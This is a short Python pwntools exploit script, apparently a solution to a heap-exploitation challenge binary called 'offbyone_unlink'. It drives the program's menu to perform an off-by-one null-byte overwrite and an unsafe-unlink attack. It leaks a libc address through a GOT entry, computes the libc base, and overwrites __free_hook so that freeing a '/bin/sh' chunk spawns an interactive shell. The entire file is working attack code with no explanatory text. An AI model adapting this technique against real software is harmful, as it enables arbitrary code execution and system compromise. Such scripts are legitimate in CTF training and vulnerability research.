from pwn import *

p = process('./offbyone_unlink')
# context.log_level = 'debug'

def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

def edit(i,s):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('index?')
    p.sendline(str(i))
    p.recvuntil('data')
    p.send(s)
# launch_gdb()
data_addr = 0x602120
new(0x108,'zzz')
new(0xf0,'aaa')
new(0x100,'/bin/sh\x00')
payload = p64(0) + p64(0x101) +\
   p64(data_addr - 0x18) + p64(data_addr - 0x10)
payload = payload.ljust(0x100,'a') + p64(0x100) + p8(0)
edit(0,payload)
delete(1)
edit(0,p64(0)*3+ p64(data_addr-0x18) +p64(0x602018))
show(1)
leak = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak - 541936 - 80
log.info(hex(libc_base))
free_hook = 3958696 + libc_base
edit(0,p64(0)*3+ p64(0x6020C0-0x18) +p64(free_hook))
edit(1,p64(283552 + libc_base)[:7])
# raw_input()
delete(2)
p.interactive()